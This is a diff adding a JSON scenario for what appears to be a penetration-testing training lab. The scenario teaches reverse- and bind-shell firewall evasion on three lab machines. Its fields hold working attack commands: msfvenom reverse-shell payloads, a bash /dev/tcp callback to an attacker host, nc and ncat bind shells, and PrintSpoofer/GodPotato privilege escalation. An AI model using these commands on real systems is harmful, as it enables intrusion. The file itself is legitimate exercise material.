@@ -1,0 +1,120 @@
+{
+  "id": "the-firewall-gauntlet",
+  "title": "The Firewall Gauntlet",
+  "category": "edge-case",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "Reverse shells blocked on common ports (4444, 4433, 1234). Must use 443/53/80 or bind shells. 3 machines, 1 network.",
+  "introduction": "This scenario trains firewall evasion: when common callback ports fail, switch to allowed ports (443, 53, 80) or use bind shells. Critical for real engagements.",
+  "mental_model": "Assume 4444/4433 blocked. Use 443, 53, or 80 for reverse shells; or ncat bind shell on allowed port. Privesc callbacks need same port logic.",
+  "key_principles": [
+    "Default to 443/80/53 for reverse shells first",
+    "Bind shell: target listens; you connect (bypasses outbound filter)",
+    "Privesc exploits need callback—use same allowed port",
+    "msfvenom LPORT=443 or LPORT=80 when 4444 fails",
+    "socat/ncat bind: -lvp 443 -e cmd.exe"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 4,
+    "enumeration_depth": 3,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 4
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0011"],
+    "techniques": [
+      {"id": "T1105", "name": "Ingress Tool Transfer"},
+      {"id": "T1021.002", "name": "SMB/Windows Admin Shares"},
+      {"id": "T1572", "name": "Protocol Tunneling"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 2, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "firewall", "reverse-shell", "bind-shell", "port-443",
+    "port-53", "port-80", "nc", "socat"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "medium",
+    "recommended_order": 19
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.60.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "fw-win1",
+      "label": "FW-WIN1",
+      "ip": "10.10.60.10",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 80, "name": "HTTP", "version": "IIS", "vulnerabilities": [{"type": "rce", "summary": "Web RCE - use port 80 for callback", "leads_to": "local-user"}], "commands": [{"cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<kali> LPORT=80 -f exe -o rev80.exe", "rationale": "Why: Port 80 allowed; 4444 blocked by firewall"}, "python3 exploit.py http://10.10.60.10 rev80.exe"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM after shell", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "iis_user", "to": "SYSTEM", "technique": "PrintSpoofer (callback on 443)", "commands": ["msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=443 -f exe -o rev443.exe", "PrintSpoofer64.exe -c \"c:\\windows\\temp\\rev443.exe\""]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "fw-win2",
+      "label": "FW-WIN2",
+      "ip": "10.10.60.11",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SMB - use bind shell on 443", "leads_to": "local-user"}], "commands": ["# On target: ncat -lvp 443 -e cmd.exe", "ncat 10.10.60.11 443"]},
+        {"port": 53, "name": "DNS", "version": "", "vulnerabilities": [{"type": "auth", "summary": "DNS often allowed - use for callback", "leads_to": "recon"}], "commands": ["msfvenom -p windows/shell_reverse_tcp LHOST=<kali> LPORT=53 -f exe -o rev53.exe"]}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "GodPotato (callback 443)", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\rev443.exe\""]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "fw-lin",
+      "label": "FW-LIN",
+      "ip": "10.10.60.12",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 80, "name": "HTTP", "version": "Apache", "vulnerabilities": [{"type": "rce", "summary": "Web RCE - callback on 80", "leads_to": "www-data"}], "commands": ["bash -i >& /dev/tcp/<kali>/80 0>&1"]},
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH after shell", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "www-data", "to": "root", "technique": "SUID (bind shell 443)", "commands": [{"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 443 >/tmp/f", "rationale": "Why: Bind shell on 443; SUID needs listener, not callback"}, "# Attacker: nc 10.10.60.12 443"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {"id": "path-fw-win1", "name": "FW-WIN1: Port 80/443 callback", "color": "#6bb8cc", "steps": ["fw-win1"], "description": "Web RCE → rev shell on 80 → PrintSpoofer callback on 443"},
+    {"id": "path-fw-win2", "name": "FW-WIN2: Bind shell 443", "color": "#e8a87c", "steps": ["fw-win2"], "description": "SMB → bind shell on 443 → GodPotato"},
+    {"id": "path-fw-lin", "name": "FW-LIN: Port 80 callback", "color": "#85e89d", "steps": ["fw-lin"], "description": "Web RCE → rev shell 80 → bind shell 443 for SUID"}
+  ]
+}
